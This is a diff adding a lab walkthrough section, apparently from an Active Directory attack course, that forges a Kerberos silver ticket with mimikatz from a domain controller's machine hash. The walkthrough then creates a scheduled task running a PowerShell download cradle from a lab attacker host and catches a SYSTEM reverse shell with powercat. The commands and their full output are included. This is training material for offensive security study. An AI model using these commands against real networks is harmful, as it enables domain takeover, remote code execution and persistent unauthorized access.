@@ -15,6 +15,76 @@ Index:
 
 ## Silver Ticket HOST
 
+Silver ticket for domain controller, should provide managemnt over the HOST service on the domain controller it's posible generate it with the hash of the dcorp-dc machine and with the same technique of the Golden ticket:
+
+```
+C:\Windows\system32>C:\AD\Tools\mimikatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt
+User      : Administrator
+Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
+SID       : S-1-5-21-719815819-3726368948-3917688648
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 9407a301944bf60d059322952f56718a - rc4_hmac_nt
+Service   : HOST
+Target    : dcorp-dc.dollarcorp.moneycorp.local
+Lifetime  : 5/1/2023 8:33:02 AM ; 5/1/2023 6:33:02 PM ; 5/8/2023 8:33:02 AM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'Administrator @ dollarcorp.moneycorp.local' successfully submitted for current session
+
+mimikatz(commandline) # exit
+Bye!
+```
+With host privileges, create new scheduled task:
+
+```
+C:\Windows\system32>schtasks.exe /create /s dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User162" /TR "powershell.exe -c 'IEX (New-Object Net.webclient).DownloadString(''http://172.16.100.162/Invoke-PowerShellTcp.ps1''')'"
+WARNING: The task name "User162" already exists. Do you want to replace it (Y/N)? Y
+SUCCESS: The scheduled task "User162" has successfully been created.
+```
+Listn with Powercat on student machine at port 443 and run the created task:
+```
+C:\Windows\system32>schtasks.exe /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User162"
+SUCCESS: Attempted to run the scheduled task "User162".
+```
+A new reverse shell should be spawned to the local machine, form the dcorp-dc server:
+
+```
+ powercat -l -p 443 -v
+VERBOSE: Set Stream 1: TCP
+VERBOSE: Set Stream 2: Console
+VERBOSE: Setting up Stream 1...
+VERBOSE: Listening on [0.0.0.0] (port 443)
+VERBOSE: Connection from [172.16.2.1] port  [tcp] accepted (source port 52782)
+VERBOSE: Setting up Stream 2...
+VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
+
+Windows PowerShell running as user DCORP-DC$ on DCORP-DC
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>PS C:\Windows\system32>
+PS C:\Windows\system32> whoami
+nt authority\system
+PS C:\Windows\system32> hostname
+dcorp-dc
+```
+
+
 
 ## Silver Ticket WMI
 
